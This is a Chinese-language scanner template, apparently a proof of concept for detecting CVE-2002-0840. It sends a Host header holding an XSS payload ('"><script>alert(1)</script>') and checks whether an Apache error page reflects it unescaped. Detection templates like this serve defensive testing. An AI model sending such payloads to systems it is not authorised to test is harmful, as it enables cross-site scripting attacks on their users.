[info]
author = "ave"
description = "通过发送包含恶意 Host 头的 HTTP 请求，检测 Apache 默认错误页面是否反射执行 XSS 载荷。当 UseCanonicalName 为 Off 且支持通配符 DNS 时，Host 头内容会被直接嵌入错误页面，导致脚本执行。"
id = "POC-AVE-2002-0027"
name = "Apache HTTP Server 错误页面跨站脚本漏洞 PoC"
severity = "medium"
tags = ["ave-2002-0027"]
vuln_id = [
    "CVE-2002-0840",
    "AVE-2002-0027",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/nonexistent"
protocol = "http"

[poc.requests.headers]
Host = '"><script>alert(1)</script>'

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert(1)</script>"]
